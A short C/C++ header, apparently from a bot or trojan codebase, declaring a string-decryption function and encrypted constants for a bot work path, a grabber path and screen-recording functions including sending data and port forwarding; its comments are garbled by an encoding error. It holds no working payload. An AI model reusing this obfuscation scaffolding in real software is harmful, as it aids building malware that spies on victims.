
//---------------------------------------------------------------------------
//  ������ �������� ��������� �������� ����
//
//  �������������: ���� 2012
//---------------------------------------------------------------------------

#ifndef StrConstsH
#define StrConstsH
//---------------------------------------------------------------------------

#include "Strings.h"

//��� ���������� ������, ������������� � ���� ����
#ifdef _MSC_VER
#	define CSSTR __declspec(align(1)) char
#else
#	define CSSTR char
#endif

//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr);





//=====================================================
//  ��������� ���������� ��������� ������
//=====================================================
extern CSSTR StrBotWorkPath[];
extern CSSTR StrGrabberPath[];

extern CSSTR StrPrefixFileName[];


// ����� ������� ���������� �����������.
extern CSSTR VideRecFuncRecordProcess[];
extern CSSTR VideRecFuncRecordWnd[];
extern CSSTR VideRecFuncStop[];
extern CSSTR VideRecFuncResetTimer[];
extern CSSTR VideRecFuncSendData[];
extern CSSTR VideRecFuncRunPortForward[];


//�� ����������� ������ � ������
extern CSSTR Slash[];
extern CSSTR SlashChar;



#endif
